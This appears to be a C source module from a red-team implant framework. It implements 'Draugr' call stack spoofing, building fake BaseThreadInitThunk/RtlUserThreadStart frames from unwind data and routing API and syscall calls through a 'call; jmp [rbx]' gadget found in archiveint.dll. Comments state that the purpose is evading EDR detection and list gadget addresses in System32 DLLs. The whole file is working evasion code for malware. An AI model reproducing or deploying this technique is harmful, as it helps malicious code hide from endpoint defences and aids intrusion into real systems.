#include <windows.h>
#include "spoof.h"
#include "tcg.h"

DECLSPEC_IMPORT HMODULE            WINAPI KERNEL32$GetModuleHandleA       ( LPCSTR );
DECLSPEC_IMPORT RUNTIME_FUNCTION * WINAPI KERNEL32$RtlLookupFunctionEntry ( DWORD64, PDWORD64, PUNWIND_HISTORY_TABLE );
DECLSPEC_IMPORT ULONG              NTAPI  NTDLL$RtlRandomEx               ( PULONG );

#define TEXT_HASH   0xEBC2F9B4
#define RBP_OP_INFO 0x5

typedef struct {
    LPCWSTR   DllPath;
    ULONG     Offset;
    ULONGLONG TotalStackSize;
    BOOL      RequiresLoadLibrary;
    BOOL      SetsFramePointer;
    PVOID     ReturnAddress;
    BOOL      PushRbp;
    ULONG     CountOfCodes;
    BOOL      PushRbpIndex;
} STACK_FRAME;

typedef enum {
    UWOP_PUSH_NONVOL = 0,
    UWOP_ALLOC_LARGE,
    UWOP_ALLOC_SMALL,
    UWOP_SET_FPREG,
    UWOP_SAVE_NONVOL,
    UWOP_SAVE_NONVOL_FAR,
    UWOP_SAVE_XMM128 = 8,
    UWOP_SAVE_XMM128_FAR,
    UWOP_PUSH_MACHFRAME
} UNWIND_CODE_OPS;

typedef unsigned char UBYTE;

typedef union {
    struct {
        UBYTE CodeOffset;
        UBYTE UnwindOp : 4;
        UBYTE OpInfo   : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE;

typedef struct {
    UBYTE Version : 3;
    UBYTE Flags   : 5;
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset   : 4;
    UNWIND_CODE UnwindCode [ 1 ];
} UNWIND_INFO;

typedef struct {
    PVOID ModuleAddress;
    PVOID FunctionAddress;
    DWORD Offset;
} FRAME_INFO;

typedef struct {
    FRAME_INFO Frame1;
    FRAME_INFO Frame2;
    PVOID      Gadget;
} SYNTHETIC_STACK_FRAME;

typedef struct {
    FUNCTION_CALL * FunctionCall;
    PVOID           StackFrame;
    PVOID           SpoofCall;
} DRAUGR_FUNCTION_CALL;

typedef struct {
    PVOID Fixup;
    PVOID OriginalReturnAddress;
    PVOID Rbx;
    PVOID Rdi;
    PVOID BaseThreadInitThunkStackSize;
    PVOID BaseThreadInitThunkReturnAddress;
    PVOID TrampolineStackSize;
    PVOID RtlUserThreadStartStackSize;
    PVOID RtlUserThreadStartReturnAddress;
    PVOID Ssn;
    PVOID Trampoline;
    PVOID Rsi;
    PVOID R12;
    PVOID R13;
    PVOID R14;
    PVOID R15;
} DRAUGR_PARAMETERS;

extern PVOID draugr_stub ( PVOID, PVOID, PVOID, PVOID, DRAUGR_PARAMETERS *, PVOID, SIZE_T, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID );

#define draugr_arg(i) ( ULONG_PTR ) ( call->args [ i ] )

void init_frame_info ( SYNTHETIC_STACK_FRAME * frame )
{
    PVOID frame1_module = KERNEL32$GetModuleHandleA ( "kernel32.dll" );
    PVOID frame2_module = KERNEL32$GetModuleHandleA ( "ntdll.dll" );

    frame->Frame1.ModuleAddress   = frame1_module;
    frame->Frame1.FunctionAddress = ( PVOID ) GetProcAddress ( ( HMODULE ) frame1_module, "BaseThreadInitThunk" );
    frame->Frame1.Offset          = 0x17;

    frame->Frame2.ModuleAddress   = frame2_module;
    frame->Frame2.FunctionAddress = ( PVOID ) GetProcAddress ( ( HMODULE ) frame2_module, "RtlUserThreadStart" );
    frame->Frame2.Offset          = 0x2c;

    /*
    We need a module that contains following instruction sequence:
        e8 ?? ?? ?? ??     call    <relative address>
        ff 23              jmp     qword ptr [rbx]

    The explanation for this request is in Zero Point Security - Red Team Ops II training, chapter "4. Load-Time Evasion", paragraph "Call me maybe":
        The `jmp qword ptr [rbx]` is a gadget which we will use during call stack spoofing for jumping back to our logic. 
        Some EDRs will check the instruction that precedes a frame's return address and use the absence of a call instruction as an IoC for call stack spoofing.
        We therefore ideally only want to use gadgets that come directly after a call.
    I also verified, that when the `call` instruction is not present before the `jmp` gadget, the Elastis Security EDR creates an alert:
        Alert: Malicious Behavior Detection Alert: Suspicious Network Module LoadLibrary
            Detects attempts to load a Microsoft networking related module from a potentially altered call stack in order to conceal the true source of the call.

    Unfortunately, none of these instruction sequences exist in a DLL that's loaded into a process by default, like KernelBase.
    We need to find another Windows DLL which contains such a gadget. We can do it using the https://github.com/rasta-mouse/GadgetHunter tool. 
    Here is its output for the C:\Windows\System32 folder:

    |-> C:\Windows\System32\archiveint.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rbx] @ 0x18010ED48 - call @ 0x18010ED43

    |-> C:\Windows\System32\AuthFWSnapin.dll
    |--> Found 6 gadget(s)
    |---> jmp qword ptr [rdi] @ 0x101F1BBB - call @ 0x101F1BB6
    |---> jmp qword ptr [rdi] @ 0x101F1DBB - call @ 0x101F1DB6
    |---> jmp qword ptr [rbx] @ 0x10250D98 - call @ 0x10250D93
    |---> jmp qword ptr [rdi] @ 0x1047201B - call @ 0x10472016
    |---> jmp qword ptr [rdi] @ 0x1047221B - call @ 0x10472216
    |---> jmp qword ptr [rbx] @ 0x104D10FB - call @ 0x104D10F6

    |-> C:\Windows\System32\ControlCenter.dll
    |--> Found 3 gadget(s)
    |---> jmp qword ptr [rsi] @ 0x18008EA63 - call @ 0x18008EA5E
    |---> jmp qword ptr [rbx] @ 0x1800BEDF3 - call @ 0x1800BEDEE
    |---> jmp qword ptr [rsi] @ 0x1800F5459 - call @ 0x1800F5454

    |-> C:\Windows\System32\d3dcsx_42.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rbx] @ 0x18044C3C2 - call @ 0x18044C3BD

    |-> C:\Windows\System32\dbgeng.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rdi] @ 0x18011DEE7 - call @ 0x18011DEE2

    |-> C:\Windows\System32\dfshim.dll
    |--> Found 3 gadget(s)
    |---> jmp qword ptr [rbx] @ 0x18002F3E5 - call @ 0x18002F3E0
    |---> jmp qword ptr [rbx] @ 0x18003863D - call @ 0x180038638
    |---> jmp qword ptr [rbx] @ 0x1800E32EA - call @ 0x1800E32E5

    |-> C:\Windows\System32\directml.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rsi] @ 0x18026F0B9 - call @ 0x18026F0B4

    |-> C:\Windows\System32\DXCaptureReplay.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rdi] @ 0x1809ACE91 - call @ 0x1809ACE8C

    |-> C:\Windows\System32\edgehtml.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rdi] @ 0x1801C093D - call @ 0x1801C0938

    |-> C:\Windows\System32\MessagingDataModel2.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rdi] @ 0x180059455 - call @ 0x180059450

    |-> C:\Windows\System32\mprddm.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rdi] @ 0x180035031 - call @ 0x18003502C

    |-> C:\Windows\System32\onnxruntime.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rbx] @ 0x18018BD5D - call @ 0x18018BD58

    |-> C:\Windows\System32\ucrtbase.dll
    |--> Found 2 gadget(s)
    |---> jmp qword ptr [rbx] @ 0x180087F9F - call @ 0x180087F9A
    |---> jmp qword ptr [rbx] @ 0x18008EB13 - call @ 0x18008EB0E

    |-> C:\Windows\System32\ucrtbase_enclave.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rbx] @ 0x18003B7BF - call @ 0x18003B7BA

    |-> C:\Windows\System32\wlancfg.dll
    |--> Found 1 gadget(s)
    |---> jmp qword ptr [rsi] @ 0x18001B711 - call @ 0x18001B70C
    */
    const char * GADGET_DLL = "archiveint.dll";
    PVOID gadget = KERNEL32$GetModuleHandleA ( GADGET_DLL );
    if ( gadget != NULL ) {
        frame->Gadget = gadget;
    }
    else {
        frame->Gadget = LoadLibraryA ( GADGET_DLL );
    }
}

BOOL get_text_section_size ( PVOID module, PDWORD virtual_address, PDWORD size )
{
    IMAGE_DOS_HEADER * dos_header = ( IMAGE_DOS_HEADER * ) ( module );
    
    if ( dos_header->e_magic != IMAGE_DOS_SIGNATURE ) {
        return FALSE;
    }

    IMAGE_NT_HEADERS * nt_headers = ( IMAGE_NT_HEADERS * ) ( ( UINT_PTR ) module + dos_header->e_lfanew );
    
    if ( nt_headers->Signature != IMAGE_NT_SIGNATURE ) {
        return FALSE;
    }

    IMAGE_SECTION_HEADER * section_header = IMAGE_FIRST_SECTION ( nt_headers );
    
    for ( int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++ )
    {
        DWORD h = ror13hash ( ( char * ) section_header[ i ].Name );

        if ( h == TEXT_HASH )
        {
            *virtual_address = section_header[ i ].VirtualAddress;
            *size            = section_header[ i ].SizeOfRawData;
            
            return TRUE;
        }
    }

    return FALSE;
}

PVOID calculate_function_stack_size ( RUNTIME_FUNCTION * runtime_function, const DWORD64 image_base )
{
    UNWIND_INFO * unwind_info = NULL;
    ULONG unwind_operation    = 0;
    ULONG operation_info      = 0;
    ULONG index               = 0;
    ULONG frame_offset        = 0;

    STACK_FRAME stack_frame = { 0 };

    if ( ! runtime_function ) {
        return NULL;
    }

    unwind_info = ( UNWIND_INFO * ) ( runtime_function->UnwindData + image_base );
    
    while ( index < unwind_info->CountOfCodes )
    {
        unwind_operation = unwind_info->UnwindCode[ index ].UnwindOp;
        operation_info   = unwind_info->UnwindCode[ index ].OpInfo;

        /* don't use switch as it produces jump tables */
        if ( unwind_operation == UWOP_PUSH_NONVOL )
        {
            stack_frame.TotalStackSize += 8;

            if ( operation_info == RBP_OP_INFO )
            {
                stack_frame.PushRbp      = TRUE;
                stack_frame.CountOfCodes = unwind_info->CountOfCodes;
                stack_frame.PushRbpIndex = index + 1;
            }
        }
        else if ( unwind_operation == UWOP_SAVE_NONVOL )
        {
            index += 1;
        }
        else if ( unwind_operation == UWOP_ALLOC_SMALL )
        {
            stack_frame.TotalStackSize += ( ( operation_info * 8 ) + 8 );
        }
        else if ( unwind_operation == UWOP_ALLOC_LARGE )
        {
            index += 1;
            frame_offset = unwind_info->UnwindCode[ index ].FrameOffset;

            if (operation_info == 0)
            {
                frame_offset *= 8;
            }
            else
            {
                index += 1;
                frame_offset += ( unwind_info->UnwindCode[ index ].FrameOffset << 16 );
            }

            stack_frame.TotalStackSize += frame_offset;
        }
        else if ( unwind_operation == UWOP_SET_FPREG )
        {
            stack_frame.SetsFramePointer = TRUE;
        }
        else if ( unwind_operation == UWOP_SAVE_XMM128 )
        {
            return NULL;
        }

        index += 1;
    }

    if ( 0 != ( unwind_info->Flags & UNW_FLAG_CHAININFO ) )
    {
        index = unwind_info->CountOfCodes;

        if ( 0 != ( index & 1 ) )
        {
            index += 1;
        }

        runtime_function = ( RUNTIME_FUNCTION * ) ( &unwind_info->UnwindCode [ index ] );
        return calculate_function_stack_size ( runtime_function, image_base );
    }

    stack_frame.TotalStackSize += 8;
    return ( PVOID ) ( stack_frame.TotalStackSize );
}

PVOID calculate_function_stack_size_wrapper ( PVOID return_address )
{
    RUNTIME_FUNCTION      * runtime_function = NULL;
    DWORD64                 image_base       = 0;
    PUNWIND_HISTORY_TABLE   history_table    = NULL;

    if ( ! return_address ) {
        return NULL;
    }

    runtime_function = KERNEL32$RtlLookupFunctionEntry ( ( DWORD64 ) return_address, &image_base, history_table );

    if ( NULL == runtime_function ) {
        return NULL;
    }

    return calculate_function_stack_size ( runtime_function, image_base );
}

PVOID find_gadget( PVOID module )
{
    BOOL  found_gadgets       = FALSE;
    DWORD text_section_size   = 0;
    DWORD text_section_va     = 0;
    DWORD counter             = 0;
    ULONG seed                = 0;
    ULONG random              = 0;
    PVOID module_text_section = NULL;

    PVOID gadget_list [ 15 ] = { 0 };

    if ( ! found_gadgets )
    {
        if ( ! get_text_section_size ( module, &text_section_va, &text_section_size ) ) {
            return NULL;
        }

        module_text_section = ( PBYTE ) ( ( UINT_PTR ) module + text_section_va );

        for ( int i = 0; i < ( text_section_size - 2 ); i++ )
        {
            /* x64 opcodes are ff 23 */
            if ( ( ( PBYTE ) module_text_section ) [ i ] == 0xFF && ( ( PBYTE ) module_text_section ) [ i + 1 ] == 0x23 )
            {
                /* check for a call before the gadget */
                if ( ( ( PBYTE ) module_text_section ) [ i - 5 ] == 0xE8 )
                {
                    gadget_list [ counter ] = ( PVOID ) ( ( UINT_PTR ) module_text_section + i );
                    counter++;

                    if ( counter == 15 ) {
                        break;
                    }
                }
            }        
        }

        found_gadgets = TRUE;
    }

    seed   = 0x1337;
    random = NTDLL$RtlRandomEx ( &seed );
    random %= counter;

    return gadget_list [ random ];
}

ULONG_PTR draugr_wrapper ( PVOID function, DWORD ssn, PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4, PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8, PVOID arg9, PVOID arg10, PVOID arg11, PVOID arg12 )
{
    int attempts         = 0;
    PVOID return_address = NULL;

    DRAUGR_PARAMETERS draugr_params = { 0 };

    if ( ssn ) {
        draugr_params.Ssn = ( PVOID ) ( ULONG_PTR ) ssn;
    }

    SYNTHETIC_STACK_FRAME frame;
    init_frame_info ( &frame );

    return_address                                 = ( PVOID ) ( ( UINT_PTR ) frame.Frame1.FunctionAddress + frame.Frame1.Offset );
    draugr_params.BaseThreadInitThunkStackSize     = calculate_function_stack_size_wrapper ( return_address );
    draugr_params.BaseThreadInitThunkReturnAddress = return_address;

    if ( ! draugr_params.BaseThreadInitThunkStackSize || ! draugr_params.BaseThreadInitThunkReturnAddress ) {
        return ( ULONG_PTR ) ( NULL );
    }

    return_address                                = ( PVOID ) ( ( UINT_PTR ) frame.Frame2.FunctionAddress + frame.Frame2.Offset );
    draugr_params.RtlUserThreadStartStackSize     = calculate_function_stack_size_wrapper ( return_address );
    draugr_params.RtlUserThreadStartReturnAddress = return_address;

    if ( ! draugr_params.RtlUserThreadStartStackSize || ! draugr_params.RtlUserThreadStartReturnAddress ) {
        return ( ULONG_PTR ) ( NULL );
    }

    do
    {
        draugr_params.Trampoline          = find_gadget ( frame.Gadget );
        draugr_params.TrampolineStackSize = calculate_function_stack_size_wrapper ( draugr_params.Trampoline );
        
        attempts++;

        if ( attempts > 15 ) {
            return ( ULONG_PTR ) ( NULL );
        }

    } while ( draugr_params.TrampolineStackSize == NULL || ( ( __int64 ) draugr_params.TrampolineStackSize < 0x80 ) );

    if ( ! draugr_params.Trampoline || ! draugr_params.TrampolineStackSize ) {
        return ( ULONG_PTR ) ( NULL );
    }

    return ( ULONG_PTR ) draugr_stub ( arg1, arg2, arg3, arg4, &draugr_params, function, 8, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12 );
}

ULONG_PTR spoof_call ( FUNCTION_CALL * call )
{
    /* very inelegant */
    if ( call->argc == 0 ) {
        return draugr_wrapper ( call->ptr, call->ssn, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 1 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 2 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 3 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 4 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 5 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), NULL, NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 6 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), NULL, NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 7 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), NULL, NULL, NULL, NULL, NULL );
    } else if ( call->argc == 8 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), ( PVOID ) draugr_arg ( 7 ), NULL, NULL, NULL, NULL );
    } else if ( call->argc == 9 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), ( PVOID ) draugr_arg ( 7 ), ( PVOID ) draugr_arg ( 8 ), NULL, NULL, NULL );
    } else if ( call->argc == 10 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), ( PVOID ) draugr_arg ( 7 ), ( PVOID ) draugr_arg ( 8 ), ( PVOID ) draugr_arg ( 9 ), NULL, NULL );
    } else if ( call->argc == 11 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), ( PVOID ) draugr_arg ( 7 ), ( PVOID ) draugr_arg ( 8 ), ( PVOID ) draugr_arg ( 9 ), ( PVOID ) draugr_arg ( 10 ), NULL );
    } else if ( call->argc == 12 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ( PVOID ) draugr_arg ( 0 ), ( PVOID ) draugr_arg ( 1 ), ( PVOID ) draugr_arg ( 2 ), ( PVOID ) draugr_arg ( 3 ), ( PVOID ) draugr_arg ( 4 ), ( PVOID ) draugr_arg ( 5 ), ( PVOID ) draugr_arg ( 6 ), ( PVOID ) draugr_arg ( 7 ), ( PVOID ) draugr_arg ( 8 ), ( PVOID ) draugr_arg ( 9 ), ( PVOID ) draugr_arg ( 10 ), ( PVOID ) draugr_arg ( 11 ) );
    } else {
        return ( ULONG_PTR ) ( NULL );
    }
}
